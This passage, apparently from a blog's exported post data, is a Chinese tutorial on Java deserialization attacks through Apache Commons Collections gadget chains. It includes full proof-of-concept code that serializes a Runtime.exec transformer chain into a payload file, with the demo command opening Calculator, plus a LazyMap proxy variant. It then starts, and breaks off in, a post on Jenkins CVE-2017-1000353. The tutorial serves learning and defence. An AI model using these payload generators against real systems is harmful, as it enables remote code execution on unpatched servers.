class=\"keyword\">this</span>.iParamTypes = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.iArgs = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">InvokerTransformer</span><span class=\"params\">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.iMethodName = methodName;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.iParamTypes = paramTypes;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.iArgs = args;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">transform</span><span class=\"params\">(Object input)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(input == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                Class cls = input.getClass();</span><br><span class=\"line\">                Method method = cls.getMethod(<span class=\"keyword\">this</span>.iMethodName, <span class=\"keyword\">this</span>.iParamTypes);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> method.invoke(input, <span class=\"keyword\">this</span>.iArgs);</span><br><span class=\"line\">            &#125;</span><br></pre></td></tr></table></figure>\n<img src=\"/2017/05/07/JAVA反序列化漏洞知识点整理/001.png\">\n<img src=\"/2017/05/07/JAVA反序列化漏洞知识点整理/002.png\">\n<p>可以看到，通过<code>transform()</code>方法里的反射，成功调用了<code>StringBuffer</code>类的<code>append()</code>方法并返回结果。</p>\n<h3 id=\"调用transform-方法\"><a href=\"#调用transform-方法\" class=\"headerlink\" title=\"调用transform()方法\"></a>调用transform()方法</h3><p>接下来就是要找到某种类，会自动调用<code>InvokerTransformer</code>类中的<code>transform()</code>方法，构造代码执行。明显调用<code>transform()</code>方法有以下两个类:</p>\n<ul>\n<li>TransformedMap</li>\n<li>LazyMap</li>\n</ul>\n<h4 id=\"TransformedMap\"><a href=\"#TransformedMap\" class=\"headerlink\" title=\"TransformedMap\"></a>TransformedMap</h4><p>Apache Commons Collections中实现<code>TransformedMap</code>类，用来对<code>Map</code>进行某种变换，只要调用其<code>decorate()</code>方法，传入key和value的变换对象<code>Transformer</code>，即可从任意<code>Map</code>对象生成相应的<code>TransformedMap</code>，<code>decorate()</code>方法如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Map <span class=\"title\">decorate</span><span class=\"params\">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>Transformer</code>是一个接口，其中定义的<code>transform()</code>方法用来将一个对象转换成另一个对象。如下所示：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public interface Transformer &#123;</span><br><span class=\"line\">    public Object transform(Object input);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>而前面提到的<code>InvokerTransformer</code>类实现了<code>Transformer</code>接口，因此这里就找到了调用<code>InvokerTransformer</code>类<code>transform()</code>方法的途径。那么，现在需要知道的是触发<code>TransformedMap</code>类调用<code>Transformer</code>的条件是什么？</p>\n<p><a href=\"https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/map/TransformedMap.html\" target=\"_blank\" rel=\"noopener\">commons-collections 3.2.2</a>指出当执行<code>Map</code>类的<code>put()</code>方法或<code>MapEntry</code>类的<code>setValue()</code>方法会自动调用<code>Transformer</code>。另外多个<code>Transformer</code>还能串起来，形成<code>ChainedTransformer</code>。</p>\n<img src=\"/2017/05/07/JAVA反序列化漏洞知识点整理/003.png\">\n<p>从图中可以看出调用<code>Map</code>类的<code>put()</code>方法会自动调用<code>InvokerTransformer</code>类的<code>transform()</code>方法。</p>\n<h4 id=\"LazyMap\"><a href=\"#LazyMap\" class=\"headerlink\" title=\"LazyMap\"></a>LazyMap</h4><p><code>LazyMap</code>实现了<code>Map</code>接口，其中的<code>get(Object)</code>方法调用了<code>transform()</code>方法，跟进函数进去</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">get</span><span class=\"params\">(Object key)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// create value for key if key is not currently in the map</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (map.containsKey(key) == <span class=\"keyword\">false</span>) &#123;</span><br><span class=\"line\">        Object value = factory.transform(key);</span><br><span class=\"line\">        map.put(key, value);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> map.get(key);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里可以看到，在调用<code>transform()</code>方法之前会先判断当前Map中是否已经有该key，如果没有最终会由这里的<code>factory.transform()</code>进行处理，跟踪<code>facory</code>变量找到<code>decorate()</code>方法。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Map <span class=\"title\">decorate</span><span class=\"params\">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> LazyMap(map, factory);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里的<code>decorate()</code>方法会对<code>factory</code>进行初始化，同时实例化一个<code>LazyMap</code>，为了能成功调用<code>transform()</code>方法，找到了<code>LazyMap</code>，发现在<code>get()</code>方法中调用了<code>transform()</code>方法，那么现在漏洞利用的核心条件就是去寻找一个类，在对象进行反序列化时会调用我们精心构造对象的<code>get(Object)</code>方法。</p>\n<h3 id=\"突破限制条件\"><a href=\"#突破限制条件\" class=\"headerlink\" title=\"突破限制条件\"></a>突破限制条件</h3><h4 id=\"TransformedMap-1\"><a href=\"#TransformedMap-1\" class=\"headerlink\" title=\"TransformedMap\"></a>TransformedMap</h4><p>虽然找到了自动调用<code>InvokerTransformer</code>类的<code>transform()</code>方法的途径，但是需要满足其触发条件：执行<code>Map</code>类的<code>put()</code>方法或<code>MapEntry</code>类的<code>setValue()</code>方法。显然这种方式还不够优雅，最佳条件是反序列化(调用<code>readObject()</code>方法)时就自动调用<code>InvokerTransformer</code>类的<code>transform()</code>方法导致代码执行。</p>\n<p>java运行库中的<code>AnnotationInvocationHandler</code>类, 有一个成员变量<code>memberValues</code>是<code>Map</code>类型，而且<code>readObject()</code>方法中对<code>memberValues</code>的每一项调用了<code>setValue()</code>方法。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AnnotationInvocationHandler</span> <span class=\"keyword\">implements</span> <span class=\"title\">InvocationHandler</span>, <span class=\"title\">Serializable</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class=\"line\"></span><br><span class=\"line\">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.type = type;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.memberValues = memberValues;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">readObject</span><span class=\"params\">(java.io.ObjectInputStream s)</span></span></span><br><span class=\"line\"><span class=\"function\">        <span class=\"keyword\">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">        s.defaultReadObject();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Check to make sure that types have not evolved incompatibly</span></span><br><span class=\"line\"></span><br><span class=\"line\">        AnnotationType annotationType = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            annotationType = AnnotationType.getInstance(type);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span>(IllegalArgumentException e) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Class is no longer an annotation type; all bets are off</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class=\"line\">            String name = memberValue.getKey();</span><br><span class=\"line\">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (memberType != <span class=\"keyword\">null</span>) &#123;  <span class=\"comment\">// i.e. member still exists</span></span><br><span class=\"line\">                Object value = memberValue.getValue();</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!(memberType.isInstance(value) ||</span><br><span class=\"line\">                      value <span class=\"keyword\">instanceof</span> ExceptionProxy)) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// 此处触发一系列的Transformer</span></span><br><span class=\"line\">                    memberValue.setValue(</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class=\"line\">                            value.getClass() + <span class=\"string\">\"[\"</span> + value + <span class=\"string\">\"]\"</span>).setMember(</span><br><span class=\"line\">                                annotationType.members().get(name)));</span><br></pre></td></tr></table></figure>\n<p>因此，我们只需要用前面构造的<code>Map</code>来构造<code>AnnotationInvocationHandler</code>，进行序列化，当触发<code>readObject()</code>反序列化的时候，就能实现命令执行。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Target;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Constructor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by js on 2017/5/6.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        String command = (args.length != <span class=\"number\">0</span>) ? args[<span class=\"number\">0</span>] : <span class=\"string\">\"/bin/sh,-c,open /Applications/Calculator.app\"</span>;</span><br><span class=\"line\">        String[] execArgs = command.split(<span class=\"string\">\",\"</span>);</span><br><span class=\"line\">        Transformer[] transforms = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(</span><br><span class=\"line\">                        <span class=\"string\">\"getMethod\"</span>,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> Class[] &#123;String.class, Class[].class&#125;,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> Object[] &#123;<span class=\"string\">\"getRuntime\"</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>]&#125;</span><br><span class=\"line\">                ),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(</span><br><span class=\"line\">                        <span class=\"string\">\"invoke\"</span>,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> Class[] &#123;Object.class, Object[].class&#125;,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> Object[] &#123;<span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>]&#125;</span><br><span class=\"line\">                ),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(</span><br><span class=\"line\">                        <span class=\"string\">\"exec\"</span>,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> Class[] &#123;String[].class&#125;,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> Object[] &#123;execArgs&#125;</span><br><span class=\"line\">                )</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(transforms);</span><br><span class=\"line\">        Map tempMap = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">        <span class=\"comment\">// tempMap 不能为空</span></span><br><span class=\"line\">        tempMap.put(<span class=\"string\">\"hack\"</span>, <span class=\"string\">\"you\"</span>);</span><br><span class=\"line\">        Map exMap = TransformedMap.decorate(tempMap, <span class=\"keyword\">null</span>, transformerChain);</span><br><span class=\"line\">        Class cls = Class.forName(<span class=\"string\">\"sun.reflect.annotation.AnnotationInvocationHandler\"</span>);</span><br><span class=\"line\">        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class=\"line\">        ctor.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        Object instance = ctor.newInstance(Target.class, exMap);</span><br><span class=\"line\"></span><br><span class=\"line\">        File f = <span class=\"keyword\">new</span> File(<span class=\"string\">\"payload1\"</span>);</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(<span class=\"keyword\">new</span> FileOutputStream(f));</span><br><span class=\"line\">        oos.writeObject(instance);</span><br><span class=\"line\">        oos.flush();</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\"></span><br><span class=\"line\">        ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(<span class=\"keyword\">new</span> FileInputStream(f));</span><br><span class=\"line\">        <span class=\"comment\">// 触发代码执行</span></span><br><span class=\"line\">        Object newObj = ois.readObject();</span><br><span class=\"line\">        ois.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这段恶意代码本质上就是利用反射调用<code>Runtime()</code> 执行了一段系统命令，作用等同于:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">((Runtime) Runtime.class.getMethod(<span class=\"string\">\"getRuntime\"</span>, <span class=\"keyword\">null</span>).invoke(<span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>)).exec(<span class=\"string\">\"/bin/sh -c open /Applications/Calculator.app\"</span>)</span><br></pre></td></tr></table></figure>\n<p>当然，反序列化时自动执行任意代码还有其他方式，具体可以分析ysoserial源码，这里就不一一叙述。采用<code>AnnotationInvocationHandler</code>类也是有条件限制的，是否能成功利用与JDK的版本有关, <a href=\"http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d\" target=\"_blank\" rel=\"noopener\">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d</a>。</p>\n<img src=\"/2017/05/07/JAVA反序列化漏洞知识点整理/004.png\">\n<p><code>AnnotationInvocationHandler</code>类移除了对<code>memberValue.setValue()</code>的调用，因此也就不能用<code>AnnotationInvocationHandler</code>+<code>TransformedMap</code>来构造POP链了。</p>\n<h4 id=\"LazyMap-1\"><a href=\"#LazyMap-1\" class=\"headerlink\" title=\"LazyMap\"></a>LazyMap</h4><p><code>AnnotationInvocationHandler</code>构造函数初始化l<code>LazyMap</code>对象, 只需要找到一个<code>memberValues.get(Object)</code>的方法即可触发该漏洞，可惜的是<code>readObject()</code>方法里面并没有这个方法. 在<code>invoke()</code>方法中<code>memberValues.get(Object)</code>被调用了，如下:</p>\n<img src=\"/2017/05/07/JAVA反序列化漏洞知识点整理/005.png\">\n<p><code>AnnotationInvocationHandler</code>类实现了<code>InvocationHandler</code>接口，所以它可以代理其他对象。这里利用这个特点，代理一个<code>Map</code>对象，得到<code>mapProxy</code>代理对象。然后，将<code>mapProxy</code>赋值到<code>AnnotationInvocationHandler</code>类中，当其调用<code>mapProxy</code>方法时，便可以触发<code>invoke()</code>方法。然后，便可以执行<code>transform</code>链。</p>\n<p>核心代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(transforms);</span><br><span class=\"line\">Map tempMap = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">Map lazyMap = LazyMap.decorate(tempMap, transformerChain);</span><br><span class=\"line\"></span><br><span class=\"line\">String classToSerialize = <span class=\"string\">\"sun.reflect.annotation.AnnotationInvocationHandler\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">final</span> Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[<span class=\"number\">0</span>];</span><br><span class=\"line\">constructor.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">InvocationHandler firstInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class=\"line\">Proxy evilProxy = (Proxy) Proxy.newProxyInstance(Test.class.getClassLoader(), <span class=\"keyword\">new</span> Class[] &#123;Map.class&#125;, firstInvocationHandler );</span><br><span class=\"line\"></span><br><span class=\"line\">InvocationHandler invocationHandlerToSerialize = (InvocationHandler) constructor.newInstance(Override.class, evilProxy);</span><br><span class=\"line\"></span><br><span class=\"line\">File f = <span class=\"keyword\">new</span> File(<span class=\"string\">\"expLazyMap.payload\"</span>);</span><br><span class=\"line\">ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(<span class=\"keyword\">new</span> FileOutputStream(f));</span><br><span class=\"line\">oos.writeObject(invocationHandlerToSerialize);</span><br><span class=\"line\">oos.flush();</span><br><span class=\"line\">oos.close();</span><br></pre></td></tr></table></figure>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"http://www.angelwhu.com/blog/?p=394\" target=\"_blank\" rel=\"noopener\">http://www.angelwhu.com/blog/?p=394</a></li>\n<li><a href=\"https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/\" target=\"_blank\" rel=\"noopener\">Lib之过？Java反序列化漏洞通用利用分析</a></li>\n<li><a href=\"https://security.tencent.com/index.php/blog/msg/97\" target=\"_blank\" rel=\"noopener\">Commons Collections Java反序列化漏洞深入分析</a></li>\n<li><a href=\"https://github.com/frohoff/ysoserial\" target=\"_blank\" rel=\"noopener\">https://github.com/frohoff/ysoserial</a></li>\n<li><a href=\"https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet\" target=\"_blank\" rel=\"noopener\">https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet</a></li>\n<li><a href=\"http://wooyun.jozxing.cc/static/drops/papers-10467.html\" target=\"_blank\" rel=\"noopener\">common-collections中Java反序列化漏洞导致的RCE原理分析</a></li>\n<li><a href=\"http://rickgray.me/2015/11/25/untrusted-deserialization-exploit-with-java.html\" target=\"_blank\" rel=\"noopener\">从反序列化到命令执行 - Java 中的 POP 执行链</a></li>\n<li><a href=\"http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/\" target=\"_blank\" rel=\"noopener\">http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/</a></li>\n<li><a href=\"http://techshow.ctrip.com/archives/1414.html\" target=\"_blank\" rel=\"noopener\">http://techshow.ctrip.com/archives/1414.html</a></li>\n</ul>\n","categories":["Web安全"],"tags":["反序列化","JAVA"]},{"title":"Jenkins 未授权远程代码执行漏洞(CVE-2017-1000353)","url":"http://www.beesfun.com/2017/05/05/Jenkins-未授权远程代码执行漏洞-CVE-2017-1000353/","content":"<h2 id=\"漏洞概要\"><a href=\"#漏洞概要\" class=\"headerlink\" title=\"漏洞概要\"></a>漏洞概要</h2><p>Jenkins 未授权远程代码执行漏洞, 允许攻击者将序列化的Java SignedObject对象传输给Jenkins CLI处理，反序列化ObjectInputStream作为Command对象，这将绕过基于黑名单的保护机制, 导致代码执行。</p>\n<a id=\"more\"></a>\n<h2 id=\"漏洞触发执行流程\"><a href=\"#漏洞触发执行流程\" class=\"headerlink\" title=\"漏洞触发执行流程\"></a>漏洞触发执行流程</h2><p><a href=\"https://blogs.securiteam.com/index.php/archives/3171\" target=\"_blank\" rel=\"noopener\">SSD的报告</a>披露了完整的漏洞细节，作为才学JAVA的我来说，看完这份报告，依旧不清楚具体的执行流程，因此有了下文，梳理漏洞触发的具体执行流程。</p>\n<p>触发jenkins反序列化导致代码执行的漏洞发生在使用HTTP协议实现双向通信通道的代码中，Jenkins利用此通道来接收命令。大致流程如下图:</p>\n<img src=\"/2017/05/05/Jenkins-未授权远程代码执行漏洞-CVE-2017-1000353/jenkins.png\">\n<h3 id=\"如何建立双向Channel\"><a href=\"#如何建立双向Channel\" class=\"headerlink\" title=\"如何建立双向Channel\"></a>如何建立双向Channel</h3><p>基于HTTP建立双向Channel的入口函数位于<code>jenkins-2.46.1/core/src/main/java/hudson/cli/CLIAction.java</code>文件中</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Extension</span> <span class=\"meta\">@Symbol</span>(<span class=\"string\">\"cli\"</span>)</span><br><span class=\"line\"><span class=\"meta\">@Restricted</span>(NoExternalUse.class)</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CLIAction</span> <span class=\"keyword\">implements</span> <span class=\"title\">UnprotectedRootAction</span>, <span class=\"title\">StaplerProxy</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">transient</span> <span class=\"keyword\">final</span> Map&lt;UUID,FullDuplexHttpChannel&gt; duplexChannels = <span class=\"keyword\">new</span> HashMap&lt;UUID, FullDuplexHttpChannel&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">\t ......</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">getTarget</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        StaplerRequest req = 